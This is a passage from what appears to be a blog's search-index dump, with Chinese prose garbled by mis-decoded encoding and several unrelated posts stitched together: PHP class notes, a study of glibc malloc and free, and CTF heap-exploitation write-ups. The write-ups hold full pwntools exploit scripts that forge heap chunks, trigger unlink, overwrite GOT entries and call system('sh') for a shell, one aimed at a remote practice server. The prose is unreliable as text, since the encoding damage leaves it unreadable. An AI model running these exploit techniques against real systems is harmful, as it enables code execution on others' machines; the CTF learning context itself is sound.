¹æ®éœ€æ±‚äº§ç”Ÿç±»çš„ç»“æ„ 2ï¼Œéœ€è¦ä½¿ç”¨æ—¶å®ä¾‹åŒ– demo &lt;?php class Nothing{ } $nothing = new Nothing(); var_dump($nothing); è¿è¡Œç»“æœ ç±»æˆå‘˜ å±æ€§å’Œæ–¹æ³•éœ€è¦ä½¿ç”¨è®¿é—®ä¿®é¥°é™å®šä¿®é¥°ç¬¦ï¼Œæš‚æ—¶ä½¿ç”¨public æˆå‘˜è®¿é—®ï¼šå±æ€§å’Œæ–¹æ³•éƒ½å±äºå¯¹è±¡è®¿é—®ï¼Œç±»å¸¸é‡å±äºç±»è®¿é—® å¯¹è±¡è®¿é—®å±æ€§å’Œæ–¹æ³•ï¼Œä½¿ç”¨-&gt; è‡ªå·±ç®€å•å†™ä¸ªä¾‹å­å¥½äº† &lt;?php class Student{ const STUDENT_NUMBER = 27; public $name; public $number; public $sex; public function print(){ echo __CLASS__; #é­”æœ¯æ–¹æ³•ï¼Œæ‰“å°ç±»å } } æˆå‘˜è®¿é—®æ–¹æ³•ï¼šå¿…é¡»é€šè¿‡å¯¹è±¡è®¿é—® å±æ€§è®¿é—®ï¼šå¢åˆ æ”¹æŸ¥ &lt;?php class Student{ const STUDENT_NUMBER = 27; public $name; public $number; public $sex; public function print(){ echo &quot;\\n&quot;.__CLASS__; #é­”æœ¯æ–¹æ³•ï¼Œæ‰“å°ç±»å } } $stu = new Student(); #å¢ $stu -&gt; tall; $stu -&gt; height = 180; #åˆ é™¤ unset($stu -&gt; number); #æ”¹ $stu -&gt; name = &quot;Tom&quot;; #æŸ¥ var_dump($stu -&gt; name); echo &quot;\\n&quot;; var_dump($stu); è¿è¡Œæƒ…å†µ è®¿é—®æ–¹æ³• $stu -&gt; print(); æ‰“å°å‡ºæ¥ç±»çš„åå­— é€šå¸¸ï¼Œæˆ‘ä»¬è®¿é—®å±æ€§ï¼Œåªç”¨æ”¹å’ŒæŸ¥å°±å¤Ÿäº† è®¿é—®ä¿®é¥°é™å®šç¬¦ æ¦‚å¿µ è®¿é—®ä¿®é¥°é™å®šç¬¦ï¼šç”¨åœ¨å±æ€§æˆ–è€…æ–¹æ³•å‰ä¿®é¥°çš„å…³é”®å­—ï¼Œæ˜¯ç”¨æ¥æ§åˆ¶å±æ€§æˆ–è€…æ–¹æ³•çš„è®¿é—®ä½ç½® åˆ†ç±» publicï¼Œå…¬æœ‰ï¼Œç±»å†…ç±»å¤–éƒ½å¯ protectedï¼Œå—ä¿æŠ¤ï¼Œåªå…è®¸åœ¨ç›¸å…³ç±»å†…éƒ¨è®¿é—® privateï¼Œç§æœ‰ï¼Œåªå…è®¸åœ¨å®šä¹‰ç±»å†…éƒ¨è®¿é—® æ–¹æ³•å¯ä»¥æ²¡æœ‰æ²¡æœ‰ä¿®é¥°é™å®šç¬¦ï¼Œé»˜è®¤public ç±»å†…éƒ¨å¯¹è±¡ æ¦‚å¿µ $this æ–¹æ³•å†…éƒ¨å†…ç½®çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè‡ªåŠ¨æŒ‡å‘æ¥è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡ æ­¥éª¤ 1ï¼Œå£°æ˜ç±»ç»“æ„ 2ï¼Œæ˜ç¡®ç§æœ‰æˆå‘˜ï¼Œä¸é™å®šæˆå‘˜çš„è®¿é—®é™å®šä¿®é¥°ç¬¦ 3ï¼Œç§æœ‰æˆå‘˜éœ€è¦åœ¨æŸç§æƒ…å†µä¸‹è¢«è®¿é—®ï¼šå¢åŠ æ–¹æ³•ï¼Œåœ¨æ–¹æ³•é‡Œä½¿ç”¨$thisè®¿é—® ç›´æ¥çœ‹ä»£ç å¥½äº† &lt;?php class Saler{ public $count = 100; public function getV(){ echo $count; //ä¼šæŠ¥é”™ï¼Œæç¤ºæœªå®šä¹‰å˜é‡ } } $s = new Saler(); $s -&gt; getV(); &lt;?php class Saler{ public $count = 100; public function getV(){ var_dump($this); echo &quot;&lt;br&gt;&quot; . $this -&gt; count; } } $s = new Saler(); $s -&gt; getV(); è¿è¡Œç»“æœ æ³¨æ„ï¼Œ$thiså¯¹è±¡æ˜¯åœ¨ç±»å†…éƒ¨è®¿é—®çš„ï¼Œå› æ­¤å¯ä»¥è®¿é—®ç±»çš„æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¸å—è®¿é—®ä¿®é¥°é™å®šç¬¦çš„é™åˆ¶ thisclasså’Œnewçš„å…³ç³»åŸç†class:å®šä¹‰ç±»ç»“æ„ï¼Œå±äºéæ‰§è¡Œæ®µä»£ç ï¼Œå› æ­¤ä¼šè¢«åŠ è½½åˆ°ä»£ç æ®µï¼ˆç¼–è¯‘ï¼‰new:å®ä¾‹åŒ–å¯¹è±¡ï¼Œå…ˆåˆ¤å®šç±»åœ¨å†…å­˜é‡Œæ˜¯å¦å­˜åœ¨ã€‚ä¸å­˜åœ¨æŠ¥é”™ã€‚è‹¥å­˜åœ¨ï¼Œåˆ™å°†ç±»å†…éƒ¨çš„å±æ€§å¤åˆ¶ä¸€ä»½ï¼Œç„¶ååœ¨å†…å­˜ï¼ˆheapï¼‰å¼€è¾Ÿä¸€å—å†…å­˜ç©ºé—´ï¼Œå°†å±æ€§æ”¾åˆ°é‡Œé¢ï¼ŒåŒæ—¶å†…éƒ¨æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ç±»çš„å†…å­˜ç©ºé—´å¯¹è±¡è®¿é—®å±æ€§å³è®¿é—®çš„æ˜¯å¯¹è±¡ç©ºé—´é‡Œå­˜å‚¨çš„éƒ¨åˆ†ï¼Œå¯¹è±¡è®¿é—®æ–¹æ³•æ˜¯é€šè¿‡å†…éƒ¨æŒ‡é’ˆæ‰¾åˆ°ç±»ç©ºé—´ä¸­çš„æ–¹æ³•ï¼Œç„¶åå†å†…å­˜ï¼ˆæ ˆï¼‰å¼€è¾Ÿè¿è¡Œthis classå’Œnewçš„å…³ç³»åŸç† class:å®šä¹‰ç±»ç»“æ„ï¼Œå±äºéæ‰§è¡Œæ®µä»£ç ï¼Œå› æ­¤ä¼šè¢«åŠ è½½åˆ°ä»£ç æ®µï¼ˆç¼–è¯‘ï¼‰ new:å®ä¾‹åŒ–å¯¹è±¡ï¼Œå…ˆåˆ¤å®šç±»åœ¨å†…å­˜é‡Œæ˜¯å¦å­˜åœ¨ã€‚ä¸å­˜åœ¨æŠ¥é”™ã€‚è‹¥å­˜åœ¨ï¼Œåˆ™å°†ç±»å†…éƒ¨çš„å±æ€§å¤åˆ¶ä¸€ä»½ï¼Œç„¶ååœ¨å†…å­˜ï¼ˆheapï¼‰å¼€è¾Ÿä¸€å—å†…å­˜ç©ºé—´ï¼Œå°†å±æ€§æ”¾åˆ°é‡Œé¢ï¼ŒåŒæ—¶å†…éƒ¨æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ç±»çš„å†…å­˜ç©ºé—´ å¯¹è±¡è®¿é—®å±æ€§å³è®¿é—®çš„æ˜¯å¯¹è±¡ç©ºé—´é‡Œå­˜å‚¨çš„éƒ¨åˆ†ï¼Œå¯¹è±¡è®¿é—®æ–¹æ³•æ˜¯é€šè¿‡å†…éƒ¨æŒ‡é’ˆæ‰¾åˆ°ç±»ç©ºé—´ä¸­çš„æ–¹æ³•ï¼Œç„¶åå†å†…å­˜ï¼ˆæ ˆï¼‰å¼€è¾Ÿè¿è¡Œ thisclasså’Œnewçš„å…³ç³»åŸç†class:å®šä¹‰ç±»ç»“æ„ï¼Œå±äºéæ‰§è¡Œæ®µä»£ç ï¼Œå› æ­¤ä¼šè¢«åŠ è½½åˆ°ä»£ç æ®µï¼ˆç¼–è¯‘ï¼‰new:å®ä¾‹åŒ–å¯¹è±¡ï¼Œå…ˆåˆ¤å®šç±»åœ¨å†…å­˜é‡Œæ˜¯å¦å­˜åœ¨ã€‚ä¸å­˜åœ¨æŠ¥é”™ã€‚è‹¥å­˜åœ¨ï¼Œåˆ™å°†ç±»å†…éƒ¨çš„å±æ€§å¤åˆ¶ä¸€ä»½ï¼Œç„¶ååœ¨å†…å­˜ï¼ˆheapï¼‰å¼€è¾Ÿä¸€å—å†…å­˜ç©ºé—´ï¼Œå°†å±æ€§æ”¾åˆ°é‡Œé¢ï¼ŒåŒæ—¶å†…éƒ¨æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ç±»çš„å†…å­˜ç©ºé—´å¯¹è±¡è®¿é—®å±æ€§å³è®¿é—®çš„æ˜¯å¯¹è±¡ç©ºé—´é‡Œå­˜å‚¨çš„éƒ¨åˆ†ï¼Œå¯¹è±¡è®¿é—®æ–¹æ³•æ˜¯é€šè¿‡å†…éƒ¨æŒ‡é’ˆæ‰¾åˆ°ç±»ç©ºé—´ä¸­çš„æ–¹æ³•ï¼Œç„¶åå†å†…å­˜ï¼ˆæ ˆï¼‰å¼€è¾Ÿè¿è¡Œthis:æ˜¯ç³»ç»Ÿåœ¨æ–¹æ³•å†…ç½®çš„å¯¹è±¡é€šç”¨åå­—ï¼Œå¯¹è±¡åœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ‰¾åˆ°å¯¹è±¡æ‰€ä¿å­˜çš„å†…å­˜åœ°å€ï¼ˆheapï¼‰ç„¶åæŠŠåœ°å€èµ‹ç»™this æœ¬è´¨ï¼šå±€éƒ¨å˜é‡ ","link":"https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/"},{"title":"glibcæºç å­¦ä¹ ","content":"ä¸»è¦æ¢ç©¶ä¸€ä¸‹mallocå’Œfreeæ˜¯å¦‚ä½•æ‰§è¡Œçš„ !!!è¯´æ˜ï¼šæœ¬æ–‡æ˜¯æ‚æ–‡ï¼Œå¯èƒ½åªæœ‰æˆ‘èƒ½çœ‹æ‡‚ï¼Œä»…ä¾›å¤ä¹ å‚è€ƒä½¿ç”¨ï¼Œä¸å®šæœŸæ›´æ–° malloc çœŸæ­£å‘æŒ¥ä½œç”¨çš„æ˜¯_int_malloc ä½†æ˜¯call mallocæ˜¯__libc_malloc åœ¨__libc_mallocä¸­ä¼šè°ƒç”¨_int_malloc æ•´ä¸ªheapçš„ä¿¡æ¯éƒ½è®°å½•åœ¨struct malloc_stateä¸­ï¼Œç§°ä¸ºmain_arena __libc_mallocä¸»ä½“éƒ¨åˆ†å¦‚ä¸‹ hookå–å¾—__malloc_hookéƒ¨åˆ†å†…å®¹ å¦‚æœæŒ‡é’ˆhook != 0 å°±è°ƒç”¨hookå‡½æ•° (ç¬¬ä¸€æ¬¡è°ƒç”¨mallocæ—¶ï¼Œ__malloc_hooké‡Œé¢å…¶å®æ˜¯æœ‰ä¸€ä¸ªå«malloc_hook_iniçš„å‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆæŠŠ__mallochookç½®0é˜²æ­¢å†æ¬¡è°ƒç”¨ï¼ˆå› ä¸ºè¿”å›åœ°å€æ˜¯__libc_mallocï¼Œç„¶åè°ƒç”¨äº†ptmalloc_init()è¿™ä¸ªåšåˆå§‹åŒ–å·¥ä½œçš„ä¸»ä½“å‡½æ•°) void * __libc_malloc (size_t bytes) { mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim; } ç‚¹è¿›å»arena_get /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */ #define arena_get(ptr, size) do { \\ ptr = thread_arena; \\ arena_lock (ptr, size); \\ } while (0) æˆ‘ä»¬ç›´æ¥ä¸Šæ‰‹è·Ÿè¸ªå¥½äº† #Include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { void *p,*q; p = malloc(100); q = malloc(16); return 0; } å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨mallocæ—¶ï¼Œä¼šè¿›å»malloc_hook_iniå‡½æ•° æ‰§è¡Œå®Œåè¿”å›åˆ°__libc_mallocå‡½æ•°é‡Œé¢ free æˆ‘ä»¬é€šè¿‡è¿™ä¸ªdemoçœ‹ä¸€ä¸‹freeè¿‡ç¨‹ä¸­å‘ç”Ÿäº†å•¥ #include &lt;stdio.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r; p = malloc(150); q = malloc(150); r = malloc(150); free(p); free(r); free(q); } å¦‚å›¾ï¼Œæˆ‘ä»¬ç°åœ¨ç”³è¯·äº†ä¸‰ä¸ªchunk freeæ‰ä¸€å—ï¼Œå¯ä»¥çœ‹åˆ°è¿›å…¥unsorted binä¸­å» æŠŠr freeæ‰ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥å’Œtop chunkåˆå¹¶äº† æ€è€ƒï¼šå¦‚æœfree qåï¼Œæ˜¯qå…ˆå’Œpåˆå¹¶å‘¢è¿˜æ˜¯å…ˆå’Œtopchunkåˆå¹¶å‘¢ï¼Ÿï¼Ÿ è°ƒè¯•å°æŠ€å·§ å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®æ˜¯å…ˆå’Œå‰ä¸€å—chunkè¿›è¡Œåˆå¹¶çš„ sizeåŠ ä¸Šprevsizeä¹‹ç±»çš„ å°æŠ€å·§ï¼Œp *(struct malloc_state*)addresså¯ä»¥å°†æŸä¸ªåœ°å€çš„å †å—è¯¦ç»†ä¿¡æ¯æ‰“å°å‡ºæ¥ å¯ä»¥çœ‹åˆ°ï¼Œæœ€ç»ˆä¸‰ä¸ªchunkéƒ½è¢«top chunkåˆå¹¶èµ·æ¥ ","link":"https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/"},{"title":"ctfwiki-unlinkâ€”2014 HITCON stkof","content":"é€šè¿‡è¿™ä¸ªé¢˜ç›®å†æ¥å­¦ä¹ ä¸‹unlink é€†å‘ mainå‡½æ•°ï¼Œä¸€æ ·æ˜¯ä¸ªèœå•é¢˜ï¼Œä½†æ˜¯æ¯”è¾ƒå‘çš„æ˜¯æ²¡ç»™èœå•ï¼Œåªèƒ½é ç”¨æˆ·æ¥é€†å‘å‡ºå…¶åŠŸèƒ½ __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int index; // eax signed int v5; // [rsp+Ch] [rbp-74h] char nptr; // [rsp+10h] [rbp-70h] unsigned __int64 v7; // [rsp+78h] [rbp-8h] v7 = __readfsqword(0x28u); alarm(0x78u); while ( fgets(&amp;nptr, 10, stdin) ) { index = atoi(&amp;nptr); if ( index == 2 ) { v5 = sub_4009E8(); goto LABEL_14; } if ( index &gt; 2 ) { if ( index == 3 ) { v5 = sub_400B07(); goto LABEL_14; } if ( index == 4 ) { v5 = sub_400BA9(); goto LABEL_14; } } else if ( index == 1 ) { v5 = sub_400936(); goto LABEL_14; } v5 = -1; LABEL_14: if ( v5 ) puts(&quot;FAIL&quot;); else puts(&quot;OK&quot;); fflush(stdout); } return 0LL; } addå †å—åŠŸèƒ½ï¼š å…¶ä¸­heaparrayåœ¨0x602140å¤„ signed __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *mem_ptr; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); mem_ptr = (char *)malloc(size); if ( !mem_ptr ) return 0xFFFFFFFFLL; ::s[++dword_602100] = mem_ptr; printf(&quot;%d\\n&quot;, (unsigned int)dword_602100, size); return 0LL; } freeï¼š no UAF signed __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; return 0LL; } edit:å¯ä»¥ä»»æ„ä¿®æ”¹å †å—sizeï¼Œé€ æˆä»»æ„å †æº¢å‡º signed __int64 sub_4009E8() { signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } IO ç¼“å†²åŒºé—®é¢˜åˆ†æ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºç¨‹åºæœ¬èº«æ²¡æœ‰è¿›è¡Œ setbuf æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ“ä½œçš„æ—¶å€™ä¼šç”³è¯·ç¼“å†²åŒºã€‚è¿™é‡Œç»è¿‡æµ‹è¯•ï¼Œä¼šç”³è¯·ä¸¤ä¸ªç¼“å†²åŒºï¼Œåˆ†åˆ«å¤§å°ä¸º 1024 å’Œ 1024ã€‚å…·ä½“å¦‚ä¸‹ï¼Œå¯ä»¥è¿›è¡Œè°ƒè¯•æŸ¥çœ‹ åˆæ¬¡è°ƒç”¨ fgets æ—¶ï¼Œmalloc ä¼šåˆ†é…ç¼“å†²åŒº 1024 å¤§å°ã€‚ åˆ«ç®¡æˆ‘è¯´çš„å•¥ï¼Œè°ƒè¯•å°±å®Œäº† exp æ€è·¯ï¼šåˆ©ç”¨unlinkä¿®æ”¹heaparray[0][1][2]ï¼Œçœ‹expå§ from pwn import * p = process('./stkof') elf = ELF('./stkof') libc = ELF('./libc.so.6') def add(size): p.sendline('1') p.sendline(str(size)) def edit(index,size,content): p.sendline('2') p.sendline(str(index)) p.sendline(str(size)) p.send(content) def delete(index): p.sendline('3') p.sendline(str(index)) add(0x10) #chunk1ï¼šå¯¹æŠ—ç¼“å†²åŒº add(0x30) #chunk2 add(0x80) #chunk3 add(0x10) #chunk4 ptr = 0x602140 fd = ptr + 0x10 - 0x18 bk = ptr + 0x10 - 0x10 fake_chunk = p64(0) fake_chunk += p64(0x31) fake_chunk += p64(fd) fake_chunk += p64(bk) fake_chunk += p64(0) * 2 fake_chunk += p64(0x30) fake_chunk += p64(0x90) edit(2,len(fake_chunk),fake_chunk) delete(3) print(&quot;ç°åœ¨ä¿®æ”¹heaparray[0][1][2] åˆ†åˆ«ä¸ºfreeï¼Œputså’Œatoi&quot;) payload = p64(0) payload += p64(elf.got['free']) payload += p64(elf.got['puts']) payload += p64(elf.got['atoi']) edit(2,len(payload),payload) print(&quot;ç°åœ¨ä¿®æ”¹freeçš„å€¼ä¸ºputsï¼Œç„¶åfree(1),å°±æ˜¯puts(1)ï¼Œå³è¾“å‡ºputsçš„çœŸå®åœ°å€&quot;) payload = p64(elf.plt['puts']) edit(0,8,payload) delete(1) #context.log_level = 'debug' puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8,b'\\x00')) print(&quot;puts addr ----&gt; &quot; + hex(puts_addr)) print(&quot;ç»è¿‡è°ƒè¯•ç®—å‡ºæ¥ç›¸å¯¹å·®å€¼ä¸º0x67860,ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€è¿‘libcè€ä¸å‡†&quot;) libc_base = puts_addr - 0x67860 print(&quot;libc ---&gt; &quot; + hex(libc_base)) system_addr = libc_base + 0x3f550 paylaod = p64(system_addr) edit(2,8,paylaod) p.sendline(&quot;sh&quot;) p.interactive() ","link":"https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"},{"title":"unlinkåˆ©ç”¨â€”hitcontraining_unlink","content":"unlink ç®€å•è¯´ä¸€ä¸‹å§ï¼Œä¸è¯´å¤ªå¤šäº†ï¼Œæ¯”è¾ƒç´¯äº† æ€»ç»“ä¸€ä¸‹ (åªè®¨è®º2.23ç‰ˆæœ¬çš„libcä¸‹çš„unlink) åˆ©ç”¨æ¡ä»¶ ä¸€ä¸ªæŒ‡å‘heapçš„æŒ‡é’ˆï¼Œåœ¨bssæ®µä¸Šä¹‹ç±»çš„ï¼Œæœ€å¥½æ²¡å¼€pieï¼Œå°±æ¯”è¾ƒè½»æ¾ç‚¹å„¿ ç„¶åè¿˜éœ€è¦å †æº¢å‡ºæˆ–è€…UAFï¼Œç›®çš„éƒ½æ˜¯æ”¹å†™smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ æ•ˆæœ ä½¿å¾—å·²æŒ‡å‘chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18 é€šç”¨æ€è·¯ è®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr ä¿®æ”¹ fd ä¸º ptr - 0x18 ä¿®æ”¹ bk ä¸º ptr - 0x10 è§¦å‘ unlink æ›´è¯¦ç»†çš„æ€è·¯ï¼š ä»¥èƒ½å¤Ÿè¿›è¡Œå †æº¢å‡ºçš„åœºæ™¯ä¸‹è¯´æ˜ï¼š 1ï¼Œç”³è¯·ä¸‰ä¸ªå †å—012ï¼Œ0ç”¨æ¥æº¢å‡ºï¼Œ1ç”¨æ¥ä½œä¸ºunsorted binï¼Œ2ç”¨æ¥ä¿æŠ¤ 2ï¼Œä¼ªé€ chunk0ï¼Œä¼ªé€ fdå’Œbkä¹‹ç±»çš„ï¼Œç„¶ååˆ©ç”¨å †æº¢å‡ºæ¥æ”¹å†™chunk1çš„prevsizeå’Œsizeçš„inuse 3ï¼Œfree1ï¼Œè§¦å‘unlink 4ï¼Œæ‰¾bssæ®µä¸Šçš„å…¨å±€æŒ‡é’ˆï¼Œçœ‹çœ‹å‘¨å›´æ€ä¹ˆåˆ©ç”¨ï¼Œæ¯”å¦‚æ”¹gotè¡¨ è§£é¢˜ é€†å‘ ä¸çœ‹äº†ï¼Œç®€å•é€†å‘ï¼Œæ¼æ´ä½äºåœ¨editä¸­ï¼Œå¯ä»¥ä»»æ„ä¿®æ”¹é•¿åº¦ï¼Œè€æ¼æ´äº† æ€è·¯ï¼Œä¼ªé€ chunkï¼Œç„¶åunlinkåˆ°bsså¤„ï¼Œæ”¹å†™heaparrayåˆ°free@gotï¼Œç„¶åä¿®æ”¹ä¸ºsystem ä¸‹å›¾ä¸ºatoiï¼Œä¸€å¼€å§‹æ˜¯ä¿®æ”¹atoiä¸ºsystemï¼Œç„¶åè¾“å…¥shæ‹¿åˆ°shellï¼Œæœ¬åœ°å¯ä»¥æ‰“é€šï¼Œä½†æ˜¯è¿œç¨‹å°±ä¸è¡Œäº†ï¼Œqswl è¿˜æœ‰libcsearcherï¼Œæˆ‘çš„libcsearcheråƒå¨å±ä¸€æ ·è¯¯å·®å°±nimaç¦»è°±ï¼Œè‰ exp from pwn import * from LibcSearcher import * #r=process('bamboobox') #r=remote('node3.buuoj.cn',28011) elf=ELF('../hitcontraining_unlink/bamboobox') r = process('../hitcontraining_unlink/bamboobox') def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context) def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context) def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) alloc(0x30,'bbbb') alloc(0x30,'bbbb') alloc(0x80,'cccc') alloc(0x20,'/bin/sh\\x00') glo=0x6020c8+0x10 fd=glo-0x18 bk=glo-0x10 payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90) edit(1,len(payload),payload) free(2) free_got=elf.got['free'] log.info(&quot;free_got:%x&quot;,free_got) payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got) #print payload1 edit(1,len(payload),payload1) show() #log.info(&quot;got:%s&quot;,r.recv()) free_addr=u64(r.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, b'\\x00')) log.info(&quot;free_addr:%x&quot;,free_addr) libc=LibcSearcher('free',free_addr) libc_base=free_addr-libc.dump('free') log.info(&quot;libc_addr:%x&quot;,libc_base) system_addr=libc_base+libc.dump('system') log.info(&quot;system_addr:%x&quot;,system_addr) edit(1,0x8,p64(system_addr)) pause() free(3) r.interactive() è¢«ç¯å¢ƒæ¶å¿ƒæ­»äº†ï¼Œæœ¬åœ°çš„cccc ","link":"https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"},{"title":"gyctf_2020_some_thing_exceting","content":"ç¬¬ä¸€æ¬¡å°è¯•äº†è¾¹åšé¢˜è¾¹å†™wpï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥ä½¿è‡ªå·±æ€è·¯æ›´å¼€é˜”ï¼Œå¾ˆä¸é”™ è¿™ä¸ªé¢˜è‡ªå·±æ²¡åšå‡ºæ¥ åŸå› ï¼šptmallocç®¡ç†æœºåˆ¶è¿˜æ˜¯ä¸ç†Ÿæ‚‰ï¼Œæ²¡æœ‰æƒ³èµ·æ¥double freeçš„åˆ©ç”¨æ¡ä»¶ï¼ˆè„‘å­æŠ½äº†ï¼Œä¸çŸ¥é“å½“æ—¶æƒ³çš„ä»€ä¹ˆ é€†å‘å’Œè§£é¢˜ä¸­çš„æ€è·¯ mainå‡½æ•° r_startå‡½æ•° å¯ä»¥å‘ç°è¿™ä¸ªå‡½æ•°è¦æ±‚åœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼Œè¦ä¸ç„¶å°±exitäº†ï¼Œæ‰€ä»¥æœ¬åœ°åšé¢˜çš„æ—¶å€™è¦åˆ›å»ºä¸€ä¸‹ ç„¶åè¿˜å¯ä»¥å‘ç°è¿™ä¸ªbssæ®µä¸­æœ‰ä¸ªå˜é‡è²Œä¼¼å¾ˆå¯ç–‘ï¼ŒåæœŸå…³æ³¨ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¼ªé€ chunkå•¥çš„ addå‡½æ•° è¿™ä¸ªç¨‹åºæ²¡æœ‰editåŠŸèƒ½ delete åˆæ­¥åˆ†ææ˜¯æœ‰UAFæ´ show æˆ‘ä»¬ç›´æ¥æ–°å»ºä¸¤ä¸ªå †å—ï¼Œçœ‹ä¸€ä¸‹å†…å­˜åˆ†å¸ƒæ˜¯ä»€ä¹ˆæ ·å­çš„ from pwn import * local = 1 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x20,'AAAAAAAA',0x30,'BBBBBBBB') add(0x10,'aaaaaaaa',0x50,'bbbbbbbb') pause() çœ‹ä¸€ä¸‹chunkåˆ†å¸ƒ å¯ä»¥åˆæ­¥åˆ¤å®šï¼Œç»¿è‰²æ¡†æ¡†æ¡†èµ·æ¥çš„chunkæ˜¯ç®¡ç†åé¢ä¸¤ä¸ªbaå’Œnaçš„chunk ä½†æ˜¯å‰é¢ä¸¤ä¸ªéå¸¸å¤§çš„chunkæš‚æ—¶å°±ä¸çŸ¥é“æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„äº† åˆ†å¸ƒå¾ˆæ¸…æ™° åˆšåˆšå‘ç°ï¼Œflagè¢«å­˜åˆ°äº†bssçš„ä¸€ä¸ªæ•°ç»„é‡Œé¢ï¼Œè§r_startå‡½æ•° è€Œä¸”bssæ®µçš„åˆ†å¸ƒå¾ˆæœ‰æ„æ€ heap[] byte_6020A0 (96) 